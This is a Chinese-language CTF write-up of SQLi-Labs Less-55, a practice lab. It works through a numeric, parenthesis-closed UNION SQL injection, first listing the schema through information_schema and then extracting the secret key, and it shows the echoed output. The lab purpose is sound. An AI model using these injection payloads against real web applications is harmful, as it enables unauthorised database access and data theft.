【SQLi-Labs】Less-55 Challenge-2 纯数字括号型联合查询 Writeup

操作者：何芊宏 | 操作日期：2026.10.28 | 分类：CTF | 标签：SQLi-Labs, Web, SQL注入, 联合查询, Challenge

1. 题目信息

  • 平台：SQLi-Labs (本地 phpStudy 环境)
  • 分类：Web - SQL注入 Challenge 系列
  • 题目名称：Less-55 (Challenge-2)
  • 提示：目标是从 challenges 库中提取密钥，限制 14 次尝试。

2. 核心原理与前置分析

本关卡与 L54 逻辑基本一致，同样具备随机表名/列名、限制尝试次数等机制。需要利用 information_schema 先收集结构信息，再进行联合查询。

核心区别：闭合方式变为纯数字型带右括号 id=(id)。无需使用单引号，直接使用 ) 闭合原有查询即可。

3. 操作步骤与解析

第一步：获取随机表名与列名（消耗 1 次尝试）

输入 URL：?id=-1) union select 1, group_concat(table_name,0x3a,column_name), 3 from information_schema.columns where table_schema='challenges' --+

回显现象：页面第 2 列回显 249c3cdd8c:id, 249c3cdd8c:sessid, 249c3cdd8c:secret_3M8Q, 249c3cdd8c:tryy。

解释与原理：使用 ) 闭合原语句，通过 information_schema.columns 查出当前库的所有表名和列名。

第二步：提取 24 位密钥（消耗 1 次尝试）

输入 URL：?id=-1) union select 1, secret_3M8Q, 3 from challenges.249c3cdd8c --+

回显现象：Your Login name:1u05DikwPbbCvsGXLc5RaNRB。

解释与原理：利用获取的真实表名和列名，直接查询目标数据。

第三步：提交通关

将获取到的密钥粘贴至页面底部的 Submit Secret Key 输入框，点击 Submit 即可通关。

4. 策略复盘

  • 精准闭合：Challenge 关卡中，上下文的变化（单引号、双引号、括号）是关键陷阱。必须优先测试出正确的闭合符。
  • 信息聚合查询：利用 group_concat 一次性拉取当前库的所有表名和列名，避免了逐一试探导致的尝试次数浪费。

5. 知识点总结

  • 元数据查询：information_schema 在未知表名场景下的决定性作用。
  • 闭合符敏感度：在纯数字和带括号的上下文中，) 替代了 ' 完成注入逻辑的逃逸。
